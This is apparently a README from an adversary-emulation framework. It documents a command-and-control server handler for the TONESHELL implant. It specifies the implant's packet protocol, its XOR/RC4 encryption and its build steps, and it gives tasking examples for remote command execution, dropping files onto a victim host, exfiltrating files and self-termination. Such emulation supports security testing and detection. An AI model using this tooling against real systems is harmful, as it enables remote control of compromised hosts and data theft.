# TONESHELL TCP Handler

The TONESHELL TCP Handler functions as the server-side counterpart to the TONESHELL implant, and communicates with it over TCP. The handler is configured to do the following:

- respond to implant beacons
- register a new implant with the control server, or indicate that a session already exists for the implant
- process the data returned after the implant completes tasks
- accept tasking from `evalsC2client.py` and send the tasks to the implant when requested
- implant file download and upload
- Handle encrypted C2 comms (XOR for TONESHELL, RC4 for Protections Test 4)

## Components

The handler consists of a TCP listener that listens on a specified address/port.

All communications between the TONESHELL implant and the C2 server will begin with the magic bytes `0x18 0x04 0x04`. The first implant packet handshake request will include the victim hostname as the message specific packet data.

The implant packet structure is as follows:

| Offset | Size | Field Name/Description |
| -------- | ------- | ------- |
| 0x0 | 0x3 | Magic bytes signature: `0x18 0x04 0x04` |
| 0x3 | 0x2 | Size of data after encryption key |
| 0x5 | 0x100 | XOR/RC4 data encryption key |
| 0x105 | 0x10 | Unique victim ID |
| 0x115 | 0x1 | Message type |
| 0x116 | x | Message-specific data |

- When C2 comms are encrypted, all fields after the key field (starting at the 0x105 offset) are encrypted.
- Note that while the implant sends a unique victim ID, this ID is not used to task the implant since this value will change across different execution instances, even on the same host. Instead, the server will generate a deterministic session ID using the MD5 hash of the implant's hostname, and this session ID is used to task and manage the implant session.

C2 server packet structure:

| Offset | Size | Field Name/Description |
| -------- | ------- | ------- |
| 0x0 | 0x3 | Magic bytes signature: `0x18 0x04 0x04` |
| 0x3 | 0x2 | Size of remaining bytes (including message type) |
| 0x5 | 0x1 | Message type |
| 0x6 | x | Message-specific data |

- When C2 comms are encrypted, all fields after the size field (starting at the 0x5 offset) are encrypted.

Implant packet types:

| Command Number | Description |
| -------- | ------- |
| 0x01 | Handshake request |
| 0x02 | Beacon |
| 0x03 | Task error occured |
| 0x13 | File chunk request |
| 0x14 | Task complete |
| 0x15 | Command output chunk |

Server packet types:

| Command Number | Description |
| -------- | ------- |
| 0x03 | File download task |
| 0x04 | No task (idle) |
| 0x05 | Exec command task |
| 0x06 | File chunk |
| 0x07 | File upload |
| 0x08 | Handshake response |
| 0x09 | Task output acknowledgement |
| 0x0A | Handshake reconnect request |
| 0xFF | Terminate self |

## Encryption

All communications between the TONESHELL implant and the C2 server will be XOR/RC4 encrypted. XOR is used in the regular TONESHELL scenario, whereas RC4 is used for Protections Test 4.

The 256-byte encryption key will be provided by the client in each encryption message, and the server will use the same key to encrypt the response.

## Usage

### Building

To build the control server binary, run the following command from the `evalsC2server` directory:

```shell
go build -o controlServer main.go
```

### Configuration

To enable and configure the TONESHELL TCP handler within the control server, provide a `toneshell` entry in your handler configuration YAML file (see example below). Adjust the host and port values as necessary.

Example:

```yaml
toneshell:
  host: 10.100.0.70
  port: 8080
  enabled: true
  encryption_type: XOR
```

- Valid `encryption_type` values are `XOR` and `RC4`. To skip encryption, leave the entire `encryption_type` field out.

Run the `controlServer` binary as `sudo` and monitor the output to see TONESHELL handler updates. Ex:

```shell
sudo ./controlServer -c ./config/your_handler_config.yml
```

### Testing

Unit tests for the TONESHELL TCP handler are available in the `toneshell_test.go` file. To run these tests, run the following command from the `evalsC2server` directory:

```shell
sudo go test ./...
```

To run only a single test, navigate to the `evalsC2server\handlers\toneshell` directory and run:

```shell
sudo go test -run NameOfTestFunction
```

### Tasking

To submit a task to the C2 server, pass the task information to the REST API server in a JSON dictionary string containing the following fields:

| Field | Data Type | Necessity | Description |
| ------------ | ----------- | ----------- |----------- |
| id | int | required | The command ID of the task the implant will execute. A table detailing the different tasks is available below. |
| taskNum | int | required | Task number. |
| timeout | int | optional | Time in seconds the implant should wait for exec (0x05) task completetion before terminating the process, defaults to 120 if not provided by operator. |
| args | string | optional | Command line arguments for the implant to execute OR paths for file upload/download. Command line length must not exceed 1024 bytes, and file paths must not exceed 256 bytes. |
| payload | string | optional | Name of the file to download. Required if sending file download task. |
| fileName | string | optional | Name of destination file for file upload. Will generate random file name if not provided. |

The following table contains the various acceptable commands and their meanings:

| Command ID | Arguments | Implant Output | Description |
| ---------- | --------- | -------------- | ------------|
| 3 | File path, payload name | Chunk requests or success/error message | File download |
| 5 | CLI arguments, timeout | Process output of CLI args | Command execution |
| 7 | File path on victim host, file name for upload | File chunks or success/error message | File upload |
| 255 | None | None | Terminate self |

Use the following format to submit the commands from the `evalsC2server` directory:

```shell
./evalsC2client.py --set-task <Session ID> '{"id":<id>, "taskNum":<task number>, "timeout":<X seconds>, "args":"<CLI args or file path>"}'
```

Example commands:

- 3: File download of payload `examplepayload.txt`

  ```shell
  ./evalsC2client.py --set-task <Session ID> '{"id": 3, "taskNum": 1, "args": "C:\\Users\\Public\\examplepayload.txt", "payload": "examplepayload.txt"}'
  ```

- 5: Task command execution of `whoami`

  ```shell
  ./evalsC2client.py --set-task <Session ID> '{"id": 5, "taskNum": 1, "timeout": 100, "args": "whoami"}'
  ```

- 7: File upload of payload at path `C:\Users\Public\examplepayload.txt` on victim host to file destination `exampleExfilPayload.txt`

  ```shell
  ./evalsC2client.py --set-task <Session ID> '{"id": 7, "taskNum": 1, "args": "C:\\Users\\Public\\examplepayload.txt", "fileName": "exampleExfilPayload.txt"}'
  ```

- 255: Terminate self

  ```shell
  ./evalsC2client.py --set-task <Session ID> '{"id": 255, "taskNum": 2}'
  ```

## CTI References

1. <https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html>
1. <https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html>
1. <https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html>
